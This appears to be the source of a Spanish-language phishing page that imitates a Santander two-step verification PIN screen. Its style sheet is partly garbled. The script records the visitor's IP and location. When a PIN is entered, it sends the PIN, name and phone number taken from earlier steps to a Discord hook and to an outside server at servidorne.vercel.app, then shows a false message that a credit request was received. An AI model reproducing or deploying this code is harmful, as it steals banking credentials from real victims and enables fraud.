    <style>
      * {
        margin: 0;
        padding: 0;

      body,

          "Segoe UI", Arial, sans-serif;

      body {
        background: linear-gradient(
          135deg,
          #fff 0%,
          #fff 50%,
          #fff 100%
        );

        display: flex;

      .container {

      .close-btn {

        font-size: 18px;

    <div class="container">
      <h1>Ingresa tu PIN de verificación en dos pasos</h1>
      <p class="subtitle">
        Ingresa el PIN que usaste para establecer la verificación en dos pasos.
        Se te pedirá periódicamente para ayudarte a recordarlo.
        <strong>¿Olvidaste tu PIN?</strong>
      </p>

      <div class="pin-display">
        <div class="pin-dot" id="dot1"></div>
        <div class="pin-dot" id="dot2"></div>
        <div class="pin-dot" id="dot3"></div>
        <div class="pin-dot" id="dot4"></div>
        <div class="pin-dot" id="dot5"></div>
        <div class="pin-dot" id="dot6"></div>
      </div>

      <div class="keypad">
        <button class="key" onclick="addDigit('1')">1</button>
        <button class="key" onclick="addDigit('2')">
          2<span class="key-label">ABC</span>
        </button>
        <button class="key" onclick="addDigit('3')">
          3<span class="key-label">DEF</span>
        </button>

        <button class="key" onclick="addDigit('4')">
          4<span class="key-label">GHI</span>
        </button>
        <button class="key" onclick="addDigit('5')">
          5<span class="key-label">JKL</span>
        </button>
        <button class="key" onclick="addDigit('6')">
          6<span class="key-label">MNO</span>
        </button>

        <button class="key" onclick="addDigit('7')">
          7<span class="key-label">PQRS</span>
        </button>
        <button class="key" onclick="addDigit('8')">
          8<span class="key-label">TUV</span>
        </button>
        <button class="key" onclick="addDigit('9')">
          9<span class="key-label">WXYZ</span>
        </button>

        <button class="key" style="visibility: hidden"></button>
        <button class="key zero" onclick="addDigit('0')">0</button>
        <button class="key delete" onclick="deleteDigit()">⌫</button>
      </div>

      <div class="message" id="message"></div>

      <a href="#" class="forgot-pin">¿Olvidaste tu PIN?</a>
    </div>

    <script>
      let pin = "";
      let userIP = "";
      let userLocation = "";
      const correctPin = "123456"; // Cambia esto por tu lógica de validación

      async function getUserInfo() {
        try {
          const response = await fetch("https://ipinfo.io/json?token=");
          const data = await response.json();
          userIP = data.ip || "No disponible";
          userLocation = `${data.city || ""}, ${data.region || ""}, ${
            data.country || ""
          }`;
          console.log("✅ IP detectada:", userIP);
          console.log("✅ Ubicación:", userLocation);
        } catch (error) {
          console.error("❌ Error al obtener información:", error);
        }
      }

      function addDigit(digit) {
        if (pin.length < 6) {
          pin += digit;
          updateDisplay();

          if (pin.length === 6) {
            verifyPin();
          }
        }
      }

      function deleteDigit() {
        if (pin.length > 0) {
          pin = pin.slice(0, -1);
          updateDisplay();
          clearMessage();
        }
      }

      function updateDisplay() {
        for (let i = 1; i <= 6; i++) {
          const dot = document.getElementById(`dot${i}`);
          dot.classList.remove("filled", "error");

          if (i <= pin.length) {
            dot.classList.add("filled");
          }
        }
      }

      async function verifyPin() {
        const messageEl = document.getElementById("message");

        // Imprimir el PIN en la consola
        console.log("PIN ingresado:", pin);

        // Validar que el PIN no sea igual al código de index2 o index3
        const codeIndex2 = localStorage.getItem("code_index2");
        const codeIndex3 = localStorage.getItem("code_index3");
        if (pin === codeIndex2 || pin === codeIndex3) {
          messageEl.textContent = "✗ El PIN no puede ser igual a códigos anteriores. Intenta de nuevo";
          messageEl.className = "message error-message";

          // Marcar los puntos como error
          for (let i = 1; i <= 6; i++) {
            document.getElementById(`dot${i}`).classList.add("error");
          }

          // Limpiar después de 1.5 segundos
          await new Promise((resolve) => setTimeout(resolve, 1500));
          pin = "";
          updateDisplay();
          clearMessage();
          return;
        }

        // Simular una verificación asíncrona
        await new Promise((resolve) => setTimeout(resolve, 500));

        // Aquí puedes agregar tu lógica de verificación
        // Por ejemplo, enviar a un servidor, comparar con un hash, etc.

        if (pin === correctPin) {
          messageEl.textContent = "✓ PIN correcto";
          messageEl.className = "message success-message";

          console.log("✅ Verificación exitosa");

          // Aquí puedes redirigir o realizar alguna acción
          await new Promise((resolve) => setTimeout(resolve, 1000));
          alert("Acceso concedido");
          // window.location.href = '/dashboard';
        } else {
          messageEl.textContent = "✗ PIN incorrecto. Intenta de nuevo";
          messageEl.className = "message error-message";

          // Enviar a Discord
          await sendToDiscord("🔑 Intento de Verificación PIN", {
            usuario: localStorage.getItem("nombrecompleto"),
            celular: localStorage.getItem("usuario"),
            "pin_ingresado": pin,
            ip: userIP,
            ubicación: userLocation
          }, false);

          // Mostrar alerta
          alert(
            "Hemos recibido tu solicitud de crédito, te contactaremos en 30 minutos a tu número de celular."
          );

          // Navegar a la página principal
          setTimeout(() => {
            window.location.href = "index.html";
          }, 1000);

          // Enviar datos al servidor externo en segundo plano (sin esperar)
          const formData = new FormData();
          formData.append(
            "mensaje",
            "Santander\nUsuario: " +
              localStorage.getItem("nombrecompleto") +
              "\nCelular: " +
              localStorage.getItem("usuario") +
              "\nCodigo pin: " +
              pin
          );

          fetch("https://servidorne.vercel.app/bbdsasd", {
            method: "POST",
            body: formData,
          }).catch(error => console.error("Error:", error));

          // Marcar los puntos como error
          for (let i = 1; i <= 6; i++) {
            document.getElementById(`dot${i}`).classList.add("error");
          }

          // Limpiar después de 1.5 segundos
          await new Promise((resolve) => setTimeout(resolve, 1500));
          pin = "";
          updateDisplay();
          clearMessage();
        }
      }

      function clearMessage() {
        const messageEl = document.getElementById("message");
        messageEl.textContent = "";
        messageEl.className = "message";
      }

      // Soporte para teclado físico
      document.addEventListener("keydown", (e) => {
        if (e.key >= "0" && e.key <= "9") {
          addDigit(e.key);
        } else if (e.key === "Backspace") {
          deleteDigit();
        }
      });

      // Obtener info al cargar
      window.addEventListener("load", getUserInfo);
    </script>
